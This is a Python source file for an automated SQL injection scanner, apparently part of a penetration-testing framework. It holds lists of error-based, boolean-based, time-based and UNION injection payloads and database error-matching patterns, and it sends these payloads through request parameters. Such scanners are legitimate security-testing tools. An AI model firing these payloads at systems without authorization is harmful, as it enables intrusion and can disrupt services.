"""
Jarwis AGI Pen Test - SQL Injection Scanner (V2 - MITM-based)
Detects SQL Injection vulnerabilities (A03:2021 - Injection)

This is the new MITM-first implementation extending BaseAttackScanner.
ALL requests are routed through MITM proxy for proper capture/replay.

Usage:
    scanner = SQLInjectionScannerV2(
        http_client=jarwis_http_client,
        request_store=request_store_db,
        checkpoint=checkpoint,
        token_manager=token_manager
    )
    findings = await scanner.run(post_login=True)
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional, Any, Tuple

from attacks.web.base_attack_scanner import (
    BaseAttackScanner,
    Finding,
    Severity,
    Confidence
)
from core.jarwis_http_client import JarwisHTTPClient, AttackResponse
from core.request_store_db import RequestStoreDB, StoredRequest
from core.scan_checkpoint import RequestLevelCheckpoint
from core.token_manager import TokenManager

logger = logging.getLogger(__name__)


class SQLInjectionScannerV2(BaseAttackScanner):
    """
    Advanced SQL Injection Scanner (V2 - MITM-based)
    
    OWASP A03:2021 - Injection
    CWE-89: SQL Injection
    
    Attack vectors:
    - Error-based SQLi
    - Boolean-based blind SQLi
    - Time-based blind SQLi
    - UNION-based SQLi
    
    All requests go through MITM via JarwisHTTPClient.
    """
    
    # Scanner identification
    scanner_name = "sqli_v2"
    attack_type = "sqli"
    owasp_category = "A03:2021"
    cwe_id = "CWE-89"
    
    # Database error patterns for detection
    DB_ERRORS = {
        'mysql': [
            r'SQL syntax.*MySQL',
            r'Warning.*mysql_',
            r'MySQL Query fail',
            r'valid MySQL result',
            r'MySQLSyntaxErrorException',
            r'com\.mysql\.jdbc',
            r'Unclosed quotation mark',
        ],
        'postgresql': [
            r'PostgreSQL.*ERROR',
            r'Warning.*pg_',
            r'valid PostgreSQL result',
            r'Npgsql\.',
            r'PG::SyntaxError',
            r'PSQLException',
        ],
        'mssql': [
            r'Driver.* SQL[\-\_\ ]*Server',
            r'OLE DB.* SQL Server',
            r'SQLServer JDBC Driver',
            r'SqlClient\.',
            r'Unclosed quotation mark after the character string',
            r'\bODBC SQL Server Driver\b',
        ],
        'oracle': [
            r'\bORA-\d{5}',
            r'Oracle error',
            r'Warning.*oci_',
            r'Oracle.*Driver',
            r'OracleException',
        ],
        'sqlite': [
            r'SQLite\/JDBCDriver',
            r'SQLite\.Exception',
            r'System\.Data\.SQLite\.SQLiteException',
            r'SQLITE_ERROR',
            r'sqlite3\.OperationalError',
        ],
        'generic': [
            r'SQL syntax',
            r'syntax error',
            r'unexpected end of SQL',
            r'quoted string not properly terminated',
            r'SQL command not properly ended',
        ],
    }
    
    # Error-based payloads
    ERROR_PAYLOADS = [
        "'",
        "''",
        '`',
        '"',
        ')',
        '(',
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "1 AND 1=1",
        "1 AND 1=2",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "admin'--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "') OR ('1'='1",
    ]
    
    # Boolean-based payloads (true, false pairs)
    BOOLEAN_PAYLOADS = [
        ("1' AND '1'='1", "1' AND '1'='2"),
        ("1 AND 1=1", "1 AND 1=2"),
        ("' OR '1'='1", "' OR '1'='2"),
        ("1' OR '1'='1' --", "1' OR '1'='2' --"),
        ("1) AND (1=1", "1) AND (1=2"),
    ]
    
    # Time-based payloads (5 second delay)
    TIME_PAYLOADS = {
        'mysql': [
            "'; SLEEP(5)--",
            "' OR SLEEP(5)--",
            "1' AND SLEEP(5)--",
        ],
        'postgresql': [
            "'; SELECT pg_sleep(5)--",
            "' OR pg_sleep(5)--",
        ],
        'mssql': [
            "'; WAITFOR DELAY '0:0:5'--",
            "' OR WAITFOR DELAY '0:0:5'--",
        ],
        'oracle': [
            "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',5)='a",
        ],
    }
    
    # High-priority parameters for SQLi
    PRIORITY_PARAMS = [
        'id', 'user', 'username', 'uid', 'pid', 'item', 'product',
        'category', 'cat', 'name', 'order', 'sort', 'search', 'query',
        'q', 'page', 'email', 'type', 'date', 'filter', 'select', 'key'
    ]
    
    def get_payloads(self) -> List[str]:
        """Return error-based payloads for quick testing."""
        return self.ERROR_PAYLOADS[:self.max_payloads_per_param]
    
    def is_applicable(self, request: StoredRequest) -> bool:
        """Check if this request should be tested for SQLi."""
        # Skip static resources
        if request.endpoint_type == 'static':
            return False
        
        # Must have parameters
        if not request.parameters:
            return False
        
        # Prioritize requests with SQLi-prone parameters
        param_names = [p.lower() for p in request.parameters.keys()]
        has_priority_param = any(p in param_names for p in self.PRIORITY_PARAMS)
        
        # Always test if has priority params, or if dynamic endpoint
        return has_priority_param or request.endpoint_type == 'dynamic'
    
    async def scan_request(self, request: StoredRequest) -> List[Finding]:
        """
        Scan a single request for SQL injection vulnerabilities.
        
        This implements the main attack logic:
        1. Get baseline response
        2. Test each parameter with error-based payloads
        3. Test with boolean-based payloads
        4. Test with time-based payloads
        5. Report any findings
        """
        findings = []
        
        # Get baseline response for comparison
        baseline = await self.send_baseline_request(request)
        if not baseline:
            logger.warning(f"[{self.scanner_name}] Could not get baseline for {request.url}")
            return findings
        
        baseline_time_ms = baseline.response_time_ms
        
        # Test each parameter
        for param_name, param_value in request.parameters.items():
            if self._cancelled:
                break
            
            # Determine injection locations to test
            locations = self._get_injection_locations(request, param_name)
            
            for location in locations:
                # 1. Error-based testing
                error_finding = await self._test_error_based(
                    request, param_name, location, baseline
                )
                if error_finding:
                    findings.append(error_finding)
                    continue  # Skip other tests if found
                
                # 2. Boolean-based testing
                boolean_finding = await self._test_boolean_based(
                    request, param_name, location, baseline
                )
                if boolean_finding:
                    findings.append(boolean_finding)
                    continue
                
                # 3. Time-based testing (slower, do last)
                time_finding = await self._test_time_based(
                    request, param_name, location, baseline_time_ms
                )
                if time_finding:
                    findings.append(time_finding)
        
        return findings
    
    def _get_injection_locations(
        self,
        request: StoredRequest,
        param_name: str
    ) -> List[str]:
        """Determine where to inject payloads for this parameter."""
        locations = []
        
        # Check if param is in query string
        if '?' in request.url and param_name in request.url:
            locations.append('query')
        
        # Check if param is in body
        if request.body and param_name in request.body:
            locations.append('body')
        
        # Default to query for GET, body for POST
        if not locations:
            if request.method.upper() == 'GET':
                locations.append('query')
            else:
                locations.append('body')
        
        return locations
    
    async def _test_error_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for error-based SQL injection."""
        
        for payload in self.ERROR_PAYLOADS[:self.max_payloads_per_param]:
            response = await self.send_payload(
                request=request,
                payload=payload,
                location=location,
                parameter_name=param_name
            )
            
            if not response:
                continue
            
            # Check for SQL error patterns
            is_vulnerable, evidence, confidence = self.detect_vulnerability(
                response, payload, baseline
            )
            
            if is_vulnerable:
                return self.create_finding(
                    request=request,
                    response=response,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity="critical",
                    title=f"Error-based SQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' is vulnerable to SQL injection. "
                        f"Database error patterns were detected in the response when "
                        f"injecting SQL syntax characters."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_boolean_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline: AttackResponse
    ) -> Optional[Finding]:
        """Test for boolean-based blind SQL injection."""
        
        for true_payload, false_payload in self.BOOLEAN_PAYLOADS[:3]:
            # Send true condition
            true_response = await self.send_payload(
                request=request,
                payload=true_payload,
                location=location,
                parameter_name=param_name
            )
            
            if not true_response:
                continue
            
            # Small delay between requests
            await asyncio.sleep(0.2)
            
            # Send false condition
            false_response = await self.send_payload(
                request=request,
                payload=false_payload,
                location=location,
                parameter_name=param_name
            )
            
            if not false_response:
                continue
            
            # Compare responses
            if self._responses_differ_significantly(true_response, false_response):
                evidence = (
                    f"True condition ({true_payload}): {true_response.status_code}, "
                    f"{len(true_response.body or '')} bytes. "
                    f"False condition ({false_payload}): {false_response.status_code}, "
                    f"{len(false_response.body or '')} bytes."
                )
                
                return self.create_finding(
                    request=request,
                    response=true_response,
                    payload=true_payload,
                    evidence=evidence,
                    confidence="high",
                    severity="high",
                    title=f"Boolean-based Blind SQL Injection in '{param_name}'",
                    description=(
                        f"The parameter '{param_name}' shows different responses "
                        f"based on injected boolean SQL conditions, indicating "
                        f"blind SQL injection vulnerability."
                    ),
                    parameter=param_name
                )
        
        return None
    
    async def _test_time_based(
        self,
        request: StoredRequest,
        param_name: str,
        location: str,
        baseline_time_ms: float
    ) -> Optional[Finding]:
        """Test for time-based blind SQL injection."""
        
        delay_seconds = 5.0
        
        for db_type, payloads in self.TIME_PAYLOADS.items():
            for payload in payloads[:1]:  # Just first payload per DB
                response = await self.send_payload(
                    request=request,
                    payload=payload,
                    location=location,
                    parameter_name=param_name
                )
                
                if not response:
                    continue
                
                # Check if response was delayed
                if self.check_time_based(response, baseline_time_ms, delay_seconds):
                    evidence = (
                        f"Baseline response: {baseline_time_ms:.0f}ms. "
                        f"With sleep payload: {response.response_time_ms:.0f}ms. "
                        f"Expected delay: {delay_seconds*1000:.0f}ms."
                    )
                    
                    return self.create_finding(
                        request=request,
                        response=response,
                        payload=payload,
                        evidence=evidence,
                        confidence="confirmed",
                        severity="critical",
                        title=f"Time-based Blind SQL Injection ({db_type}) in '{param_name}'",
                        description=(
                            f"The parameter '{param_name}' is vulnerable to time-based "
                            f"blind SQL injection. The {db_type} sleep payload caused "
                            f"a measurable delay in server response."
                        ),
                        parameter=param_name
                    )
        
        return None
    
    def detect_vulnerability(
        self,
        response: AttackResponse,
        payload: str,
        original_response: Optional[AttackResponse] = None
    ) -> Tuple[bool, str, str]:
        """
        Analyze response for SQL injection indicators.
        
        Returns:
            Tuple of (is_vulnerable, evidence, confidence)
        """
        if not response.body:
            return False, "", ""
        
        body = response.body
        
        # Check for SQL error patterns
        for db_type, patterns in self.DB_ERRORS.items():
            for pattern in patterns:
                match = re.search(pattern, body, re.IGNORECASE)
                if match:
                    return (
                        True,
                        f"{db_type} error: {match.group(0)[:100]}",
                        "confirmed" if 'syntax' in match.group(0).lower() else "high"
                    )
        
        # Check for significant response differences
        if original_response and original_response.body:
            orig_len = len(original_response.body)
            new_len = len(body)
            
            # Significant size change with error keywords
            if abs(new_len - orig_len) > orig_len * 0.5:
                if any(kw in body.lower() for kw in ['error', 'exception', 'warning']):
                    return (
                        True,
                        f"Response size changed significantly ({orig_len} → {new_len} bytes) with error indicators",
                        "medium"
                    )
        
        return False, "", ""
    
    def _responses_differ_significantly(
        self,
        resp1: AttackResponse,
        resp2: AttackResponse
    ) -> bool:
        """Check if two responses differ significantly (for boolean-based)."""
        # Different status codes
        if resp1.status_code != resp2.status_code:
            return True
        
        # Get content lengths
        len1 = len(resp1.body or '')
        len2 = len(resp2.body or '')
        
        # Empty response comparison
        if len1 == 0 or len2 == 0:
            return len1 != len2
        
        # Significant length difference (>10%)
        diff_ratio = abs(len1 - len2) / max(len1, len2)
        if diff_ratio > 0.1:
            return True
        
        # Check for specific content differences
        body1 = (resp1.body or '').lower()
        body2 = (resp2.body or '').lower()
        
        indicators = ['error', 'not found', 'invalid', 'success', 'welcome']
        for indicator in indicators:
            if (indicator in body1) != (indicator in body2):
                return True
        
        return False


# Backwards compatibility - can be imported as the main scanner
SQLInjectionScanner = SQLInjectionScannerV2
